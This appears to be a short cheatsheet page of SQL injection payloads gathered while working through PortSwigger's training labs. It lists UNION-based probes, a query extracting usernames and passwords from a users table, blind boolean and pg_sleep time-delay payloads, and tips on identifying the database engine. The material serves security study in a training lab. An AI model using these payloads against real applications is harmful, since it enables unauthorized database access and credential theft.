---
title: "PortSwigger SQLi Labs - Payload Cheatsheet"
description: "Lab-specific payloads collected while working through PortSwigger's SQL injection track."
category: "Web Pentest"
tags: ["sql-injection", "portswigger", "cheatsheet"]
date: "2026-02-02"
---

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```sql
' OR 1=1--
```

## Lab: SQL injection UNION attack, determining the number of columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- -- error means 2 columns exist
```

## Lab: SQL injection UNION attack, finding a column containing text

```sql
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--
```

## Lab: SQL injection UNION attack, retrieving data from other tables

```sql
' UNION SELECT username, password FROM users--
```

## Lab: Blind SQL injection with conditional responses

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
```

## Lab: Blind SQL injection with time delays

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## Tips

- Always confirm the backend DB engine first (error messages, `SLEEP()` vs
  `pg_sleep()` vs `WAITFOR DELAY` behavior differ by engine).
- Keep a per-engine version of each payload in your notes - syntax drifts a
  lot between MySQL, PostgreSQL, and MSSQL.
